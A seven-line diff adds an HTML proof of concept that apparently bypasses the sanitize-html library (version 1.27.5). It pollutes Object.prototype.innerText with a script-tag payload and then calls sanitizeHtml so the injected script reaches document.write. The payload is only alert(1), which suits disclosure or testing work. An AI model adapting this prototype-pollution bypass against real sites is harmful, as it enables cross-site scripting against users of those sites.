@@ -1,0 +1,7 @@
+<script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script>
+<script>
+  Object.prototype.innerText = "<script>alert(1)<\/script>"
+</script>
+<script>
+  document.write(sanitizeHtml('<a>'))
+</script>
